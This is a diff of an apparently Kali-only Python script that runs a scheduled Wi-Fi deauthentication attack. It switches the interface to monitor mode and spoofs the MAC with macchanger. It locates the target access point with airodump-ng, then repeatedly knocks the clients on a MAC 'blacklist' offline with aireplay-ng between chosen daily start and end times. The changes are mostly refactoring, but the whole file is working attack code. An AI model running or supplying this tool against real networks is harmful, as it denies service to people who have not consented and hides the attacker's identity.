@@ -4,12 +4,12 @@
 #
 import os
 import csv
-import sys
 import time
 import argparse
 import datetime
-from subprocess import *
+import subprocess
 from threading import Thread
+from platform import platform
 
 class Engine(object):
  def __init__(self,mac,wlan,mode,s_hr,s_min,e_hr,e_min,desti='list-01.csv'):
@@ -37,34 +37,43 @@ class Engine(object):
   self.e_min = int(e_min)
 
  def monitor(self):
-  Popen(['ifconfig',self.wlan,'down']).wait()
-  Popen(['iwconfig',self.wlan,'mode','monitor']).wait()
-  Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull).wait()
-  Popen(['ifconfig',self.wlan,'up']).wait()
-  Popen(['service','network-manager','stop']).wait()
+  subprocess.Popen(['ifconfig',self.wlan,'down']).wait()
+  subprocess.Popen(['iwconfig',self.wlan,'mode','monitor']).wait()
+  subprocess.Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull).wait()
+  subprocess.Popen(['ifconfig',self.wlan,'up']).wait()
+  subprocess.Popen(['service','network-manager','stop']).wait()
 
  def managed(self):
-  Popen(['ifconfig',self.wlan,'down']).wait()
-  Popen(['iwconfig',self.wlan,'mode','managed']).wait()
-  Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull).wait()
-  Popen(['ifconfig',self.wlan,'up']).wait()
-  Popen(['service','network-manager','restart']).wait()
+  subprocess.Popen(['ifconfig',self.wlan,'down']).wait()
+  subprocess.Popen(['iwconfig',self.wlan,'mode','managed']).wait()
+  subprocess.Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull).wait()
+  subprocess.Popen(['ifconfig',self.wlan,'up']).wait()
+  subprocess.Popen(['service','network-manager','restart']).wait()
 
- def scan(self):
-  Popen(['pkill','airodump-ng']).wait();self.clean()
-  cmd=['airodump-ng','--bssid',self.bssid,'-c',self.chan,self.wlan]
-  Popen(cmd,stderr=Devnull,stdout=Devnull)
+ def update(self):
+  output='/tmp/output'
+  devnull=open(output,'w+')
+  cmd=['iw','dev',self.wlan,'set','channel',self.chan,'HT20']
+  subprocess.Popen(cmd,stdout=devnull,stderr=devnull).wait()
+  subprocess.Popen(['pkill','airodump-ng']).wait()
+  self.analyze(output)
+  self.clean()
+
+ def analyze(self,file):
+  if from_file_to_list(file,mac=0):
+   self.monitor()
+   time.sleep(.4)
+   self.update()
 
  def obtainInfo(self):
-  Popen(['pkill','airodump-ng']).wait()
+  subprocess.Popen(['pkill','airodump-ng']).wait()
   self.clean()
   cmd=['airodump-ng','--output-format','csv','-w','list',self.wlan]
-  Popen(cmd,stderr=Devnull,stdout=Devnull)
+  subprocess.Popen(cmd,stderr=Devnull,stdout=Devnull)
 
  def attack(self,client):
-  devnull=open('/tmp/out','w+')
   cmd=['aireplay-ng','-0','1','-a',self.bssid,'-c',client,'--ignore-negative-one',self.wlan]
-  Popen(cmd,stdout=devnull,stderr=devnull).wait()
+  subprocess.Popen(cmd,stdout=Devnull,stderr=Devnull).wait()
 
  def now(self):
   time=str(datetime.datetime.now()).split()[1][:5]
@@ -93,19 +102,19 @@ class Engine(object):
     os.remove(item)
 
  def kill(self):
-  Popen(['pkill','airodump-ng']).wait()
-  Popen(['pkill','aireplay-ng']).wait()
+  subprocess.Popen(['pkill','airodump-ng']).wait()
+  subprocess.Popen(['pkill','aireplay-ng']).wait()
   self.state=False
   self.alive=False
   self.delay=False
-  self.managed()
+  [self.managed() for i in range(2)]
   self.clean()
   self.run=False
 
-def from_file_to_list(file):
+def from_file_to_list(file,mac=1):
  list=[]
  if not os.path.exists(file):
-  call(['clear'])
+  subprocess.call(['clear'])
   exit('[!] Unable to locate: {}'.format(file))
 
  with open(file,'r') as _file:
@@ -115,8 +124,8 @@ def from_file_to_list(file):
     new_item.replace('\n','')
     list.append(new_item)
 
- if not len(list):
-  call(['clear'])
+ if not len(list) and mac:
+  subprocess.call(['clear'])
   exit('[!] Unable to find mac addresses in: {}'.format(file))
  return list
 
@@ -129,7 +138,7 @@ def main():
  UserArgs.add_argument('blacklist', help='path to blacklist with mac addresses')
  UserArgs.add_argument('start',     help='time to start attack each day; Military Time; Enter 15:07')
  UserArgs.add_argument('end',       help='time to stop  attack each day; Military Time; Enter 17:15')
- Args = UserArgs.parse_args()
+ Args=UserArgs.parse_args()
 
  # Assign Variables
  list  = Args.blacklist if Args.blacklist else Args.blacklist
@@ -143,7 +152,7 @@ def main():
  #
  blist=[mac for mac in blist]
  s_hr,s_min,e_hr,e_min=Args.start[:2],Args.start[3:],Args.end[:2],Args.end[3:]
- engine = Engine(macs,wlan,mode,s_hr,s_min,e_hr,e_min)
+ engine=Engine(macs,wlan,mode,s_hr,s_min,e_hr,e_min)
 
  # Enable Monitor Mode
  engine.monitor()
@@ -156,9 +165,9 @@ def main():
   if engine.alive:
    engine.obtainInfo()
    time.sleep(5)
-   Popen(['pkill','airodump-ng']).wait()
+   subprocess.Popen(['pkill','airodump-ng']).wait()
    chan=str(engine.channels())
-   if chan: engine.chan=chan
+   if chan:engine.chan=chan
    else:print '[!] Unable to locate: {}'.format(engine.bssid)
 
  # Keeps An Eye On The Time While Main Process Is Busy
@@ -175,7 +184,7 @@ def main():
      if a!=b:continue
 
      if alpha == engine.e_hr and beta == engine.e_min:
-      Popen(['pkill','airodump-ng']).wait()
+      subprocess.Popen(['pkill','airodump-ng']).wait()
       engine.state=False
       engine.alive=False
       engine.delay=False
@@ -192,27 +201,26 @@ def main():
 
    # When It's On; Display
    if engine.state:
-    call(['clear'])
+    subprocess.call(['clear'])
     print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,engine.n_e_h,engine.n_e_m)
 
    #  When It's Off; Display
    elif engine.state==False:
-    call(['clear'])
+    subprocess.call(['clear'])
     engine.state=False
     engine.delay=False
     engine.alive=False
-    Popen(['pkill','airodump-ng']).wait()
+    subprocess.Popen(['pkill','airodump-ng']).wait()
     print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,engine.n_s_h,engine.n_s_m)
 
    # When It's Not Off Or On
    else:
     # Messages To Display; It Depends On If It's Off Or Neutral
     if engine.alive:
-     call(['clear'])
+     subprocess.call(['clear'])
      print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(msg,engine.n_e_h,engine.n_e_m)
-
     else:
-     call(['clear'])
+     subprocess.call(['clear'])
      print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,engine.n_s_h,engine.n_s_m)
 
    # When It's On; Do This
@@ -223,25 +231,25 @@ def main():
 
    # When It's Off; Do This
    if engine.state==False:
-    if engine.alive:Popen(['pkill','airodump-ng']).wait();engine.clean();engine.alive=False
+    if engine.alive:subprocess.Popen(['pkill','airodump-ng']).wait();engine.clean();engine.alive=False
+
+   # Smart Delay
+   def delay():
+    for n in range(engine.dely):
+     time.sleep(1)
+     if not engine.alive:
+      break
 
    # Attack Function
    def attack(client):
-    for n in range(3):
-     engine.attack(client)
-
-     # Smart delay
-     for i in range(30):
-      time.sleep(1);
-      if not engine.run:
-       break
+    engine.attack(client)
 
    # When Alive; Do This
    if engine.alive:
     engine.delay=True
     Thread(target=check).start()
     updates()
-    engine.scan()
+    engine.update()
 
     # Disconnect Clients From The Blacklist
     for client in blist:
@@ -252,10 +260,8 @@ def main():
     if len(blist):
      while bot.is_alive() and engine.alive:pass
 
-    # Smart Delay;
-    for k in range(engine.dely):
-     if engine.alive:time.sleep(1)
-     else:break
+    # Pause
+    delay()
 
     # Kills The Time Keeping Thread
     engine.delay=False
@@ -265,20 +271,21 @@ def main():
 
    # Flush List That Holds Time
    del mem[0][:];del mem[1][:]
-
   except KeyboardInterrupt:
-   call(['clear'])
+   subprocess.call(['clear'])
    print '[-] Exiting ...'
    engine.kill()
 
 if __name__ == '__main__':
  # Filters
- if sys.platform != 'linux2':
+ if not 'kali' in platform():
   exit('[-] Kali Linux 2.0 Required!')
 
+ # Root?
  if os.getuid():
   exit('[-] Root Access Required!')
 
+ # Suppress Output
  Devnull = open(os.devnull,'w')
 
  # Start
